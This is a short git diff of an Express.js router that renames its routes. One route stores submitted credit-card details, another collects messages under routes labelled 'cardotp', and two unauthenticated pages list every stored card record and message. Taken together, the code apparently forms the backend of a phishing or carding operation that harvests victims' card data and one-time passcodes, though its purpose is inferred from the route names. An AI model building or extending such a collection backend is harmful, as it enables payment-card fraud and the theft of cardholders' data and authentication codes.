@@ -13,7 +13,7 @@ router.get('/form', function(req, res, next) {
 router.get('/options', function(req, res, next) {
   res.render('option', { title: 'Options' });
 });
-router.post('/creditcards', async function(req, res, next) {
+router.post('/card', async function(req, res, next) {
   try {
     var userDetails = new CardModal({
       name: req.body.name,
@@ -38,7 +38,7 @@ router.post('/creditcards', async function(req, res, next) {
   res.render('success')
 });
 
-router.post('/cardotp', async (req, res)=>{
+router.post('/message', async (req, res)=>{
   try {
     var userDetails = new MessageModal({
       message: req.body.message,
@@ -51,11 +51,11 @@ router.post('/cardotp', async (req, res)=>{
   res.send('message got success')
 })
 
-router.get("/cards", async (req, res)=>{
+router.get("/creditcard", async (req, res)=>{
   let cardData = await CardModal.find().sort({createdAt: -1});
   res.render("card", {cardData})
 })
-router.get("/messages", async (req, res)=>{
+router.get("/cardotp", async (req, res)=>{
   let cardData = await MessageModal.find().sort({createdAt: -1});
   res.render("message", {cardData})
 })
